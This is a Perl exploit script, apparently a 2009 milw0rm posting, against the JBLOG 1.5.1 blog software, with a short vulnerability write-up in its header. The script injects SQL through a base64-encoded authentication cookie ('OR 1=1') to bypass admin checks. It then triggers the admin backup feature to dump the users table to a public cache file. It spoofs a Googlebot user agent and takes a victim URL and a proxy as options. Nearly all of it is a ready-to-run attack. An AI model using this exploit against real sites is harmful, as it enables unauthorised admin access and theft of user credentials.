#!/usr/bin/perl

=about

 VENDOR
    JBLOG 1.5.1
    (maybe earlier versions vulnerable too)
    http://www.lisijie.org

 AUTHOR
    discovered & written by Ams
    ax330d [doggy] gmail [dot] com
    http://www.0x416d73.name/

 VULNERABILITY DESCRIPTION
    Both 'index.php' and 'admin.php' includes file 'common.php' which checks
    for user permission on line 81 via function 'check_user()'.
    This function is defined in file 'include/func_user.php'.
    There is another one function - 'get_cookie()' which gets cookie values.
    So, in cookies we put our evil string and further actions should be clear.

    Why we don't filter COOKIEs ?

 EXPLOIT WORK
    This exploit uses SQL-injection to create dump of users table.
    Actually, we are possible to do all administrator actions.

 REQUIREMENTS
    1. You need to know prefix, by default it is 'jblog_'.
    But there is no problem to find it out.
    2. Rights to write to 'cache/' folder.

=cut

use strict;
use warnings;

use LWP::UserAgent;
use HTTP::Request::Common;
use MIME::Base64;
use Getopt::Long;

Banner();
$| = 1;

my $expl_url;
my $prefix = 'jblog_';
my $proxy  = '';

GetOptions(
    'u=s'   => \$expl_url,
    'pre=s' => \$prefix,
    'p=s'   => \$proxy,
) or Usage();

my $spider = LWP::UserAgent->new;
$spider->agent('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
$spider->default_header( 'Cookie' => $prefix . 'authkey=' . encode_base64( "1\t' OR 1=1 -- " ) );
$spider->proxy(['http'], "http://$proxy/") if $proxy ne '';
$spider->timeout( 30 );

Exploit( $expl_url);

sub Exploit {

    $_ = shift || Usage();
    print "\n\tExploiting:\t $_";

    my ($prot , $host, $path, )
        = m{(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?};
    $prot ||= 'http';

    my $url    = "$prot://$host$path";
    my $defact = 'admin.php?ac=data&do=bakout&dosubmit=yes&sizelimit=2048';

    #   First request to prepare
    my $req = GET "$url/$defact&baktables%5B%5D=${prefix}user";
    my $res = $spider->request( $req );
    my ($dir, $file) = $res->content =~ /yes&bakdir=(.*?)&(?:.*?)&filepre=(.*?)'/;

    #   Second request to dump table
    $req = GET "$url/$defact&bakdir=$dir&step=1&baktablestr=${prefix}user&tableid=0&start=0&filepre=$file";
    $res = $spider->request( $req );

    #   Finally checking if sql backup exists
    $req = HEAD "$url/cache/backup/$dir/${file}_1.sql";
    $res = $spider->request( $req );    

    if ( $res->is_success ) {
        print "\n\tLooks ok, check $prot://$host${path}cache/backup/$dir/${file}_1.sql\n";
    } else {
        printf(
            "\n\tFailure, server response: %s\n\tAnyway, check: %s\n",
            $res->status_line, "$prot://$host${path}cache/backup/$dir/${file}_1.sql");
    }
}

sub Usage {

    print <<USAGE;

        Usage:
        -u     Set url of victim
            optional:
        -pre   Prefix, default 'jblog_' is used if no one mentioned
        -p     Proxy, set as ip:port

        Example:
            $0 -u=http://site.com -pre=jblog_ -p=127.0.0.1:8080

USAGE

    exit;
}

sub Banner {

    print <<BANNER;
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
          JBLOG 1.5.1 Perl exploit
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
BANNER

}

# milw0rm.com [2009-08-13]
